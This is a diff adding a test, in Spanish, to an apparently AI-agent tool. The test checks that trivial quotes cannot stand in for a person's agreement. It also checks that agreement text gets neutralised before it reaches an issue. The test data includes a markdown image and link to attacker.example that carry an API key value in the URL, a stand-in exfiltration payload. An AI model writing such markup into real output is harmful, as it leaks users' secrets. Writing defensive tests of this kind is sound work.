@@ -44,6 +44,19 @@ test("agreement: una cita que la persona no escribió se rechaza (modelo, tools,
 	const s = await f.state(); assert.equal(s.agreements?.length ?? 0, 0); assert.ok(isApproved(s));
 });
 
+test("agreement: una cita trivial no valida, y lo acordado llega al issue sin imágenes ni links activos", async (t) => {
+	const f = await approved(t);
+	say(f, "a ok, dale");
+	for (const quote of ["a", "ok", "dale", "a ok"]) await assert.rejects(f.action({ action: "agreed", quote, agreement: "Ampliar", replan: false }), /al menos 3 palabras o 15 letras/, quote);
+	assert.equal((await f.state()).agreements?.length ?? 0, 0);
+	say(f, "Sumá el link que te pasé al README");
+	const exfil = "![x](https://attacker.example/c?d=API_KEY_VALUE) [click](https://attacker.example)";
+	await f.action({ action: "agreed", quote: "el link que te pasé", agreement: exfil, replan: false });
+	const section = parseIssueBody(f.remote.body).section ?? "";
+	assert.ok(section.includes("«el link que te pasé» → `![x](https://attacker.example/c?d=API_KEY_VALUE)` `[click](https://attacker.example)`"), section);
+	assert.ok(!section.includes(` ${exfil}`), "la imagen no puede renderizarse ni cargarse");
+});
+
 test("agreement: las instrucciones ya no piden editar el issue para autorizar y explican cómo registrar el acuerdo", async (t) => {
 	const f = await approved(t); const status = JSON.stringify((await f.action({ action: "status" })).content);
 	assert.doesNotMatch(status, /actualizar el issue|editar el issue|pedí actualizar/i); assert.match(status, /agreed/); assert.match(status, /cita textual/i);
